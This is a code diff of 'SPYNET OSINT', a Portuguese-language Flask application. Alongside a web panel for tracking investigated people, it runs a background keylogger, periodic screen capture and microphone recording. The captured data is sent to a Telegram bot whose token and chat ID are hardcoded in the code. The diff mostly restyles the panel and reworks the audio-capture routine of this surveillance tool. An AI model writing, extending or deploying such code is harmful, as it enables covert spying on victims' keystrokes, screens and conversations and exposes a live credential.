@@ -1,9 +1,8 @@
 """
-SPYNET OSINT ULTIMATE — PAINEL COMPLETO
-Com áudio com volume máximo e qualidade profissional
+SPYNET OSINT ULTIMATE — PAINEL COMPLETO COM LOGO AJUSTADA
 """
 
-from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file
+from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file, send_from_directory
 from datetime import datetime, timezone, timedelta
 from io import BytesIO
 from reportlab.lib.pagesizes import A4
@@ -20,6 +19,14 @@ app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "spynet-osint-2026")
 
 BR_TZ = timezone(timedelta(hours=-3))
+
+# ============================================
+# ROTA PARA ARQUIVOS ESTÁTICOS
+# ============================================
+
+@app.route('/static/<path:filename>')
+def serve_static(filename):
+    return send_from_directory('static', filename)
 
 # ============================================
 # CONFIGURAÇÕES
@@ -41,7 +48,7 @@ for pasta in [DATA_DIR, MONITOR_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
 # ============================================
 monitor_ativo = False
 tempo_screenshot = 5
-tempo_audio = 10
+tempo_audio = 15
 buffer_teclas = ""
 ultimo_tempo = time.time()
 ultimas_teclas = []
@@ -51,7 +58,6 @@ ultimas_teclas = []
 # ============================================
 
 def enviar_telegram(texto, caminho=None):
-    """Envia notificações para o Telegram"""
     BOT_TOKEN = "8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0"
     CHAT_ID = "5672315001"
     try:
@@ -126,52 +132,23 @@ def capturar_screenshot():
         return None
 
 def capturar_audio():
-    """Captura áudio com volume máximo e qualidade profissional"""
     global monitor_ativo, ultimo_audio
     if not monitor_ativo:
         return None
     try:
         nome = f"aud_{int(time.time())}.wav"
         caminho = os.path.join(AUDIO_DIR, nome)
-        
-        fs = 48000  # 48kHz para melhor qualidade
-        duracao = 5  # 5 segundos
-        
-        print("🎤 Gravando áudio com volume máximo...")
-        
-        # Configurar para capturar áudio mais alto
-        gravacao = sd.rec(int(duracao * fs), samplerate=fs, channels=1, dtype='float32')
-        sd.wait()
-        
-        # Aplicar ganho agressivo (12x para volume máximo)
-        gravacao = gravacao * 12.0
-        
-        # Normalização para evitar distorção
-        max_amp = np.max(np.abs(gravacao))
-        if max_amp > 1.0:
-            gravacao = gravacao / max_amp * 0.98
-        
-        # Aplicar compressor suave para aumentar volume percebido
-        threshold = 0.25
-        ratio = 4
-        for i in range(len(gravacao)):
-            if abs(gravacao[i]) > threshold:
-                gravacao[i] = threshold + (gravacao[i] - threshold) / ratio
-        
-        # Ganho final
-        gravacao = gravacao * 1.8
-        
-        # Salvar com qualidade máxima
-        sf.write(caminho, gravacao, fs, subtype='PCM_24')
-        
-        print(f"✅ Áudio salvo: {nome} (volume maximizado)")
-        
-        # Enviar para Telegram
+        fs = 44100
+        duracao = 10
+        print(f"🎤 Gravando áudio por {duracao} segundos...")
+        gravacao = sd.rec(int(duracao * fs), samplerate=fs, channels=1, dtype='float32', blocking=True)
+        gravacao = gravacao * 8.0
+        gravacao = np.clip(gravacao, -1.0, 1.0)
+        sf.write(caminho, gravacao, fs)
+        print(f"✅ Áudio salvo: {nome}")
         enviar_telegram("🎤 Áudio", caminho)
-        
         ultimo_audio = caminho
         return caminho
-        
     except Exception as e:
         print(f"❌ Erro ao capturar áudio: {e}")
         return None
@@ -187,14 +164,18 @@ def loop_audio():
     global monitor_ativo, tempo_audio
     while True:
         if monitor_ativo:
+            start_time = time.time()
             capturar_audio()
-        time.sleep(tempo_audio)
+            elapsed = time.time() - start_time
+            wait_time = max(0, tempo_audio - elapsed)
+            time.sleep(wait_time)
+        else:
+            time.sleep(1)
 
 def iniciar_keylogger():
     with keyboard.Listener(on_press=processar_tecla) as listener:
         listener.join()
 
-# Iniciar threads em segundo plano
 threading.Thread(target=iniciar_keylogger, daemon=True).start()
 threading.Thread(target=loop_captura, daemon=True).start()
 threading.Thread(target=loop_audio, daemon=True).start()
@@ -236,7 +217,6 @@ def buscar_redes_sociais(nome, username=None, email=None, telefone=None):
     if username:
         resultados.append({"categoria": "📷 INSTAGRAM", "titulo": "Perfil", "url": f"https://www.instagram.com/{username}", "icone": "📷"})
     if nome:
-        resultados.append({"categoria": "📷 INSTAGRAM", "titulo": "Busca", "url": f"https://www.instagram.com/explore/tags/{nome.replace(' ', '')}", "icone": "📷"})
         resultados.append({"categoria": "📘 FACEBOOK", "titulo": "Busca", "url": f"https://www.facebook.com/search/top?q={nome.replace(' ', '%20')}", "icone": "📘"})
         resultados.append({"categoria": "🐦 TWITTER", "titulo": "Busca", "url": f"https://twitter.com/search?q={nome.replace(' ', '%20')}", "icone": "🐦"})
         resultados.append({"categoria": "💼 LINKEDIN", "titulo": "Busca", "url": f"https://www.linkedin.com/search/results/people/?keywords={nome.replace(' ', '%20')}", "icone": "💼"})
@@ -271,7 +251,6 @@ def buscar_credito(cpf):
     if cpf:
         resultados.append({"categoria": "📊 SCORE", "titulo": "Consultar Score", "url": "https://www.serasa.com.br/consulta-cpf/", "icone": "📊"})
         resultados.append({"categoria": "🚫 RESTRIÇÕES", "titulo": "Restrições", "url": "https://www.serasa.com.br/consulta-cpf/restricoes/", "icone": "🚫"})
-        resultados.append({"categoria": "📋 PROTESTOS", "titulo": "Protestos", "url": f"https://www.google.com/search?q=protesto+cartorio+cpf+{cpf}", "icone": "📋"})
     return resultados
 
 def buscar_vazamentos(email):
@@ -314,8 +293,12 @@ def ler_keylog():
     return []
 
 # ============================================
-# ROTAS PRINCIPAIS
+# ROTAS
 # ============================================
+
+@app.route('/favicon.ico')
+def favicon():
+    return '', 204
 
 @app.route("/")
 def index():
@@ -571,7 +554,7 @@ def gerar_relatorio(caso_id):
     return send_file(buffer, as_attachment=True, download_name=f"relatorio_{caso['id']}.pdf", mimetype="application/pdf")
 
 # ============================================
-# TEMPLATES
+# TEMPLATES COM LOGO AJUSTADA
 # ============================================
 
 LOGIN_HTML = '''
@@ -579,26 +562,39 @@ LOGIN_HTML = '''
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>SPYNET — ACESSO</title>
+    <title>SPYNET — Acesso</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:linear-gradient(135deg,#0a0a2a,#1a1a3a);font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh}
-        .card{background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);border-radius:20px;padding:40px;width:380px;text-align:center}
-        h1{color:#00ffcc}
-        input{width:100%;padding:14px;margin:10px 0;background:rgba(0,0,0,0.5);border:1px solid #00ffcc;border-radius:10px;color:white;font-size:16px}
-        button{width:100%;padding:14px;background:#00ffcc;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:16px}
-        .erro{color:#ff4444;margin-top:10px}
+        body{background:radial-gradient(ellipse at 20% 30%, #0a0e1a, #03060c);font-family:'Segoe UI',Arial;display:flex;justify-content:center;align-items:center;height:100vh;position:relative}
+        body::before{content:'';position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(0,136,255,.02) 0px,rgba(0,136,255,.02) 2px,transparent 2px,transparent 8px);pointer-events:none}
+        .card{background:rgba(5,10,20,0.9);border:1px solid #00ffcc;border-radius:8px;padding:40px;width:450px;text-align:center;box-shadow:0 0 40px rgba(0,255,204,0.1),inset 0 1px 0 rgba(255,255,255,0.05);backdrop-filter:blur(5px)}
+        .logo{margin:0 auto 20px auto;text-align:center}
+        .logo img{max-width:280px;width:100%;height:auto}
+        .sub{font-size:10px;color:#8899aa;letter-spacing:3px;margin-bottom:30px;border-top:1px solid rgba(0,255,204,0.3);padding-top:15px}
+        input{width:100%;padding:14px;margin:12px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:4px;color:#00ffcc;font-family:monospace;font-size:16px;text-align:center;letter-spacing:2px}
+        input:focus{outline:none;border-color:#00ffcc;box-shadow:0 0 15px rgba(0,255,204,0.3)}
+        button{width:100%;padding:14px;background:linear-gradient(90deg,#00ffcc,#00ccff);border:none;border-radius:4px;font-family:monospace;font-weight:bold;font-size:16px;letter-spacing:3px;cursor:pointer;transition:all .3s;color:#0a0e1a;margin-top:10px}
+        button:hover{background:#00ffcc;box-shadow:0 0 20px #00ffcc;transform:scale(1.01)}
+        .erro{color:#ff2244;margin-top:15px;font-size:12px;letter-spacing:1px}
+        .badge{position:absolute;bottom:15px;right:20px;font-size:9px;color:#334455;font-family:monospace}
+        .scan-line{position:absolute;top:0;left:0;width:100%;height:2px;background:linear-gradient(90deg,transparent,#00ffcc,transparent);animation:scan 4s linear infinite}
+        @keyframes scan{0%{top:0}100%{top:100%}}
     </style>
 </head>
 <body>
+<div class="scan-line"></div>
 <div class="card">
-    <h1>🔍 SPYNET</h1>
+    <div class="logo">
+        <img src="/static/logo.png" alt="SPYNET">
+    </div>
+    <div class="sub">• SISTEMA DE INTELIGÊNCIA •</div>
     <form method="POST">
-        <input type="password" name="senha" placeholder="Senha" autofocus required>
+        <input type="password" name="senha" placeholder="••••••••" autofocus required>
         <button type="submit">🔐 ACESSAR</button>
     </form>
-    {% if erro %}<div class="erro">{{ erro }}</div>{% endif %}
+    {% if erro %}<div class="erro">⚠️ {{ erro }}</div>{% endif %}
 </div>
+<div class="badge">CLASSIFICAÇÃO: SIGILOSO • SPYNET SECURITY</div>
 </body>
 </html>
 '''
@@ -608,12 +604,13 @@ PAINEL_COMPLETO_HTML = '''
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>SPYNET — PAINEL COMPLETO</title>
+    <title>SPYNET — Painel</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:#0a0e1a;font-family:'Segoe UI',Arial;color:#e8edf5;padding:20px}
         .navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px 25px;display:flex;justify-content:space-between;align-items:center;margin-bottom:25px;flex-wrap:wrap;gap:10px}
-        .logo{font-size:28px;font-weight:bold;letter-spacing:4px;color:#00ffcc;text-shadow:0 0 8px #00ffcc}
+        .logo{height:45px;display:flex;align-items:center}
+        .logo img{height:100%;width:auto}
         .btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;cursor:pointer;text-decoration:none;color:#00ffcc;font-size:12px;font-weight:bold;transition:all .3s;display:inline-block;margin:0 3px}
         .btn:hover{background:#00ffcc;color:#0a0e1a;box-shadow:0 0 10px #00ffcc}
         .btn-start{background:#00cc66;border-color:#00cc66;color:#fff}
@@ -640,11 +637,12 @@ PAINEL_COMPLETO_HTML = '''
         .modal img{max-width:90%;max-height:90%}
         .close{position:absolute;top:20px;right:40px;font-size:40px;cursor:pointer}
         @media (max-width: 1000px){.stats-grid{grid-template-columns:repeat(2,1fr)}.grid-2{grid-template-columns:1fr}}
+        @media (max-width: 768px){.logo{height:35px}}
     </style>
 </head>
 <body>
 <div class="navbar">
-    <div class="logo">🕵️ SPYNET</div>
+    <div class="logo"><img src="/static/logo.png" alt="SPYNET"></div>
     <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">
         <div class="status-indicator"><div class="led"></div><span id="statusText">{% if monitor_ativo %}🟢 MONITORANDO{% else %}🔴 PARADO{% endif %}</span></div>
         <button class="btn-start btn" onclick="iniciarMonitor()">▶️ INICIAR</button>
@@ -669,88 +667,42 @@ PAINEL_COMPLETO_HTML = '''
         <div class="section-title">📸 ÚLTIMAS SCREENSHOTS</div>
         <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:10px">
             {% for s in screenshots[:8] %}
-            <div class="screenshot-item">
-                <img src="/monitor/screenshot/{{ s.caminho }}" onclick="abrirModal(this.src)">
-                <div style="font-size:10px;color:#8899aa;margin-top:5px">{{ s.data }}</div>
-            </div>
-            {% else %}
-            <p style="color:#8899aa;text-align:center;grid-column:span 2">Nenhuma screenshot</p>
-            {% endfor %}
+            <div class="screenshot-item"><img src="/monitor/screenshot/{{ s.caminho }}" onclick="abrirModal(this.src)"><div style="font-size:10px;color:#8899aa;margin-top:5px">{{ s.data }}</div></div>
+            {% else %}<p style="color:#8899aa;text-align:center;grid-column:span 2">Nenhuma screenshot</p>{% endfor %}
         </div>
     </div>
-
     <div class="section">
         <div class="section-title">🎤 ÚLTIMOS ÁUDIOS</div>
         {% for a in audios[:10] %}
-        <div class="audio-item">
-            <audio controls src="/monitor/audio/{{ a.caminho }}"></audio>
-            <div style="font-size:10px;color:#8899aa;margin-top:5px">{{ a.data }}</div>
-        </div>
-        {% else %}
-        <p style="color:#8899aa;text-align:center">Nenhum áudio</p>
-        {% endfor %}
+        <div class="audio-item"><audio controls src="/monitor/audio/{{ a.caminho }}"></audio><div style="font-size:10px;color:#8899aa;margin-top:5px">{{ a.data }}</div></div>
+        {% else %}<p style="color:#8899aa;text-align:center">Nenhum áudio</p>{% endfor %}
     </div>
 </div>
 
 <div class="section">
     <div class="section-title">⌨️ TECLAS DIGITADAS</div>
     <div style="max-height:300px;overflow-y:auto">
-        {% for linha in keylog %}
-        <div class="keylog-item">💬 {{ linha }}</div>
-        {% else %}
-        <p style="color:#8899aa;text-align:center">Nenhuma tecla capturada</p>
-        {% endfor %}
+        {% for linha in keylog %}<div class="keylog-item">💬 {{ linha }}</div>{% else %}<p style="color:#8899aa;text-align:center">Nenhuma tecla capturada</p>{% endfor %}
     </div>
 </div>
 
 <div class="section">
     <div class="section-title">📁 MEUS CASOS</div>
     {% for caso in casos %}
-    <div class="caso-card">
-        <div><span class="badge">{{ caso.id }}</span><br><strong>{{ caso.investigado }}</strong><br><small>{{ caso.status }}</small></div>
-        <div><a href="/caso/{{ caso.id }}" class="btn" style="padding:5px 12px">VER</a><a href="/relatorio/{{ caso.id }}.pdf" class="btn" style="padding:5px 12px">PDF</a></div>
-    </div>
-    {% else %}
-    <p style="color:#8899aa;text-align:center">Nenhum caso registrado. <a href="/novo_caso" style="color:#00ffcc">Criar primeiro caso →</a></p>
-    {% endfor %}
+    <div class="caso-card"><div><span class="badge">{{ caso.id }}</span><br><strong>{{ caso.investigado }}</strong><br><small>{{ caso.status }}</small></div><div><a href="/caso/{{ caso.id }}" class="btn" style="padding:5px 12px">VER</a><a href="/relatorio/{{ caso.id }}.pdf" class="btn" style="padding:5px 12px">PDF</a></div></div>
+    {% else %}<p style="color:#8899aa;text-align:center">Nenhum caso registrado. <a href="/novo_caso" style="color:#00ffcc">Criar primeiro caso →</a></p>{% endfor %}
 </div>
 
-<div id="modal" class="modal" onclick="fecharModal()">
-    <span class="close">&times;</span>
-    <img id="modal-img">
-</div>
+<div id="modal" class="modal" onclick="fecharModal()"><span class="close">&times;</span><img id="modal-img"></div>
 
 <script>
-function abrirModal(src){
-    document.getElementById('modal-img').src = src;
-    document.getElementById('modal').style.display = 'flex';
-}
-function fecharModal(){
-    document.getElementById('modal').style.display = 'none';
-}
-function atualizarStatus(){
-    fetch('/api/monitor/status').then(r=>r.json()).then(d=>{
-        document.getElementById('statusText').innerText = d.ativo ? "🟢 MONITORANDO" : "🔴 PARADO";
-    });
-}
-function iniciarMonitor(){
-    fetch('/api/monitor/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:true})})
-        .then(()=>{atualizarStatus();setTimeout(()=>location.reload(),2000)});
-}
-function pararMonitor(){
-    fetch('/api/monitor/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:false})})
-        .then(()=>{atualizarStatus();setTimeout(()=>location.reload(),2000)});
-}
-function limparMonitor(){
-    if(confirm('⚠️ LIMPAR TODOS OS DADOS DO MONITORAMENTO?')){
-        fetch('/api/monitor/limpar',{method:'POST'}).then(()=>location.reload());
-    }
-}
-function limparCasos(){
-    if(confirm('⚠️ REMOVER TODOS OS CASOS?')){
-        fetch('/api/limpar_casos',{method:'POST'}).then(()=>location.reload());
-    }
-}
+function abrirModal(src){document.getElementById('modal-img').src=src;document.getElementById('modal').style.display='flex';}
+function fecharModal(){document.getElementById('modal').style.display='none';}
+function atualizarStatus(){fetch('/api/monitor/status').then(r=>r.json()).then(d=>{document.getElementById('statusText').innerText=d.ativo?"🟢 MONITORANDO":"🔴 PARADO";});}
+function iniciarMonitor(){fetch('/api/monitor/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:true})}).then(()=>{atualizarStatus();setTimeout(()=>location.reload(),2000)});}
+function pararMonitor(){fetch('/api/monitor/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:false})}).then(()=>{atualizarStatus();setTimeout(()=>location.reload(),2000)});}
+function limparMonitor(){if(confirm('⚠️ LIMPAR TODOS OS DADOS DO MONITORAMENTO?')){fetch('/api/monitor/limpar',{method:'POST'}).then(()=>location.reload());}}
+function limparCasos(){if(confirm('⚠️ REMOVER TODOS OS CASOS?')){fetch('/api/limpar_casos',{method:'POST'}).then(()=>location.reload());}}
 setInterval(atualizarStatus, 5000);
 </script>
 </body>
@@ -764,15 +716,16 @@ NOVO_CASO_HTML = '''
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0e1a;font-family:Arial;color:#e8edf5;padding:20px}
-.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px;margin-bottom:20px}
-.logo{font-size:24px;color:#00ffcc}
+.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center}
+.logo{height:35px}
+.logo img{height:100%;width:auto}
 .btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;text-decoration:none;color:#00ffcc}
 .card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:8px;padding:25px;max-width:600px;margin:0 auto}
 input,select,textarea{width:100%;padding:12px;margin:10px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:4px;color:#fff}
 button{background:#00ffcc;border:none;padding:12px;border-radius:4px;font-weight:bold;cursor:pointer;width:100%}
 </style>
 </head>
-<body><div class="navbar"><div class="logo">🔍 SPYNET</div><a href="/painel" class="btn">← PAINEL</a></div>
+<body><div class="navbar"><div class="logo"><img src="/static/logo.png" alt="SPYNET"></div><a href="/painel" class="btn">← PAINEL</a></div>
 <div class="card"><h2>➕ NOVO CASO</h2>
 <form method="POST">
 <select name="tipo" required><option value="">TIPO...</option><option>Pessoa física</option><option>Pessoa jurídica</option><option>Patrimonial</option><option>Crédito</option></select>
@@ -794,8 +747,9 @@ CASO_DETALHE_HTML = '''
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0e1a;font-family:Arial;color:#e8edf5;padding:20px}
-.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px;margin-bottom:20px}
-.logo{font-size:24px;color:#00ffcc}
+.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center}
+.logo{height:35px}
+.logo img{height:100%;width:auto}
 .btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;text-decoration:none;color:#00ffcc}
 .card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:8px;padding:25px;margin-bottom:20px}
 .status{display:inline-block;padding:5px 12px;border-radius:4px;font-size:12px}
@@ -806,7 +760,7 @@ input,textarea,select{width:100%;padding:12px;margin:10px 0;background:#0a0e1a;b
 button{background:#00ffcc;border:none;padding:12px;border-radius:4px;font-weight:bold;cursor:pointer}
 </style>
 </head>
-<body><div class="navbar"><div class="logo">🔍 SPYNET</div><a href="/painel" class="btn">← PAINEL</a></div>
+<body><div class="navbar"><div class="logo"><img src="/static/logo.png" alt="SPYNET"></div><a href="/painel" class="btn">← PAINEL</a></div>
 <div class="card"><h2>{{ caso.investigado }}</h2><p><span class="badge">{{ caso.id }}</span> • {{ caso.criado_em }}</p><p><strong>CLIENTE:</strong> {{ caso.cliente }}</p><p><strong>TIPO:</strong> {{ caso.tipo }}</p><p><strong>STATUS:</strong> <span class="status status-{{ 'andamento' if caso.status == 'Em andamento' else 'concluido' }}">{{ caso.status }}</span></p><p><strong>OBJETIVO:</strong> {{ caso.objetivo }}</p>{% if caso.notas %}<p><strong>NOTAS:</strong> {{ caso.notas }}</p>{% endif %}</div>
 <div class="card"><h3>📋 ETAPAS</h3>{% for e in caso.etapas %}<div class="etapa-card"><strong>ETAPA {{ e.num }}: {{ e.titulo }}</strong><div>{{ e.tipo }} • {{ e.ts }}</div><p style="margin-top:10px">{{ e.dados }}</p></div>{% else %}<p>NENHUMA ETAPA.</p>{% endfor %}</div>
 <div class="card"><h3>➕ ADICIONAR ETAPA</h3><input type="text" id="titulo" placeholder="TÍTULO"><select id="tipo"><option>Identificação</option><option>OSINT</option><option>Patrimonial</option><option>Conclusão</option></select><textarea id="dados" rows="5" placeholder="DADOS"></textarea><button onclick="adicionarEtapa()">➕ SALVAR</button></div>
@@ -822,8 +776,9 @@ OSINT_HTML = '''
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0e1a;font-family:Arial;color:#e8edf5;padding:20px}
-.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px;margin-bottom:20px}
-.logo{font-size:24px;color:#00ffcc}
+.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center}
+.logo{height:35px}
+.logo img{height:100%;width:auto}
 .btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;text-decoration:none;color:#00ffcc}
 .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px}
 .card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:8px;padding:25px}
@@ -835,7 +790,7 @@ button{background:#00ffcc;border:none;padding:12px;border-radius:4px;font-weight
 .categoria-titulo{color:#ffaa44;margin:15px 0 8px}
 </style>
 </head>
-<body><div class="navbar"><div class="logo">🔍 SPYNET OSINT</div><div><a href="/painel" class="btn">← PAINEL</a></div></div>
+<body><div class="navbar"><div class="logo"><img src="/static/logo.png" alt="SPYNET"></div><div><a href="/painel" class="btn">← PAINEL</a></div></div>
 <div class="grid">
 <div class="card"><h2>🌐 REDES SOCIAIS</h2><input type="text" id="rede_nome" placeholder="Nome"><input type="text" id="rede_username" placeholder="Username"><input type="email" id="rede_email" placeholder="Email"><input type="tel" id="rede_telefone" placeholder="Telefone"><button onclick="buscarRedes()">🔍 BUSCAR</button><div id="rede_resultados"></div></div>
 <div class="card"><h2>🏠 BENS</h2><input type="text" id="bens_cpf" placeholder="CPF/CNPJ"><button onclick="buscarBens()">🔍 BUSCAR</button><div id="bens_resultados"></div></div>
@@ -859,6 +814,11 @@ async function buscarVazamentos(){const e=document.getElementById('vazado_email'
 # ============================================
 
 if __name__ == "__main__":
+    # Criar pasta static se não existir
+    if not os.path.exists('static'):
+        os.makedirs('static')
+        print("📁 Pasta 'static' criada! Coloque sua logo.png dentro dela.")
+    
     port = int(os.environ.get("PORT", 5000))
     print("=" * 60)
     print("🕵️ SPYNET OSINT ULTIMATE - PAINEL COMPLETO")
@@ -866,12 +826,9 @@ if __name__ == "__main__":
     print(f"🔐 Senha: {SISTEMA_SENHA}")
     print(f"📱 Acesse: http://localhost:{port}")
     print("=" * 60)
-    print("✅ Botões disponíveis:")
-    print("   ▶️ INICIAR - Começa monitoramento")
-    print("   ⏸️ PARAR - Pausa monitoramento")
-    print("   🗑️ LIMPAR DADOS - Remove screenshots, áudios e teclas")
-    print("   🗑️ LIMPAR CASOS - Remove todos os casos")
-    print("=" * 60)
-    print("🎤 ÁUDIO: Volume máximo (ganho 12x + compressor)")
+    print("📁 Para adicionar sua logo:")
+    print("   1. Coloque sua imagem na pasta 'static'")
+    print("   2. Renomeie para 'logo.png'")
+    print("   3. Execute novamente")
     print("=" * 60)
     app.run(host="0.0.0.0", port=port, debug=False)
